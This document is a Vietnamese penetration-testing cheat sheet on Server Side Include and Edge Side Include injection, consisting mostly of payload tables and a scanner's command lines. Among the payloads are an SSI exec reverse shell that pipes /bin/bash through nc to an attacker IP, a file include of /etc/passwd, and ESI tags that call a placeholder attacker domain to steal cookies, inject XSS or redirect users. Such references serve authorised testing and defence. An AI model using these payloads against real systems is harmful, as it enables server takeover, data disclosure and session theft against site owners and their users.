# Server Side Include Injection

> **Server Side Includes (SSI)** là các directive được đặt trong các trang HTML và được server đánh giá trong quá trình phục vụ trang. SSI cho phép thêm nội dung được tạo động vào một HTML page hiện có mà không cần phục vụ toàn bộ page thông qua CGI program hoặc công nghệ dynamic khác.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
* [Edge Side Inclusion](#edge-side-inclusion)
* [References](#references)

## Tools

* [https://github.com/vladko312/SSTImap](https://github.com/vladko312/SSTImap) - Công cụ tự động phát hiện SSTI với giao diện tương tác, dựa trên [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap), hỗ trợ phát hiện và khai thác SSI với `--legacy` hoặc `-e SSI`

  ```bash
  python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s
  python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI
  python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
  ```

## Methodology

SSI Injection xảy ra khi kẻ tấn công có thể đưa các Server Side Include directive vào một web application. SSI là các directive có thể include file, thực thi command hoặc in environment variable/attribute. Nếu user input không được sanitization đúng cách trong SSI context, input này có thể bị lợi dụng để thay đổi hành vi phía server, truy cập thông tin nhạy cảm hoặc thực thi command.

Format của SSI:

`<!--#directive param="value" -->`

| Mô tả               | Payload                                                                               |
| ------------------- | ------------------------------------------------------------------------------------- |
| In ngày hiện tại    | `<!--#echo var="DATE_LOCAL" -->`                                                      |
| In tên document     | `<!--#echo var="DOCUMENT_NAME" -->`                                                   |
| In toàn bộ variable | `<!--#printenv -->`                                                                   |
| Thiết lập variable  | `<!--#set var="name" value="Rich" -->`                                                |
| Include một file    | `<!--#include file="/etc/passwd" -->`                                                 |
| Include một file    | `<!--#include virtual="/index.html" -->`                                              |
| Thực thi command    | `<!--#exec cmd="ls" -->`                                                              |
| Reverse shell       | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

## Edge Side Inclusion

HTTP surrogate không thể phân biệt giữa ESI tag hợp lệ do upstream server tạo ra và ESI tag độc hại được chèn vào HTTP response. Điều này có nghĩa là nếu kẻ tấn công có thể inject ESI tag vào HTTP response, surrogate có thể xử lý và đánh giá chúng mà không kiểm tra thêm, vì cho rằng chúng là các tag hợp lệ đến từ upstream server.

Một số surrogate yêu cầu ESI handling được chỉ ra thông qua `Surrogate-Control` HTTP header:

```ps1
Surrogate-Control: content="ESI/1.0"
```

| Mô tả               | Payload                                                                                       |
| ------------------- | --------------------------------------------------------------------------------------------- |
| Blind detection     | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]>`                                              |
| XSS                 | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>`                              |
| Cookie stealer      | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>`          |
| Include một file    | `<esi:include src="supersecret.txt">`                                                         |
| Hiển thị debug info | `<esi:debug/>`                                                                                |
| Thêm header         | `<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->`                          |
| Inline fragment     | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |

| Software                     | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
| ---------------------------- | -------- | ---- | ------- | ------------------------- | -------------- |
| Squid3                       | Yes      | Yes  | Yes     | Yes                       | No             |
| Varnish Cache                | Yes      | No   | No      | Yes                       | Yes            |
| Fastly                       | Yes      | No   | No      | No                        | Yes            |
| Akamai ESI Test Server (ETS) | Yes      | Yes  | Yes     | No                        | No             |
| NodeJS' esi                  | Yes      | Yes  | Yes     | No                        | No             |
| NodeJS' nodesi               | Yes      | No   | No      | No                        | Optional       |

## References

* [Beyond XSS: Edge Side Include Injection - Louis Dion-Marcil - April 3, 2018](https://web.archive.org/web/20190321030437/https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection)
* [DEF CON 26 - Edge Side Include Injection Abusing Caching Servers into SSRF - ldionmarcil - October 23, 2018](https://web.archive.org/web/20250916100719/https://www.youtube.com/watch?v=VUZGZnpSg8I)
* [ESI Injection Part 2: Abusing specific implementations - Philippe Arteau - May 2, 2019](https://web.archive.org/web/20260208231729/https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations)
* [Exploiting Server Side Include Injection - n00py - August 15, 2017](https://web.archive.org/web/20260115183939/https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
* [Server Side Inclusion/Edge Side Inclusion Injection - HackTricks - July 19, 2024](https://web.archive.org/web/20210615171520/https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
* [Server-Side Includes (SSI) Injection - Weilin Zhong, Nsrav - December 4, 2019](https://web.archive.org/web/20220123033237/https://owasp.org/www-community/attacks/Server-Side_Includes_%28SSI%29_Injection)
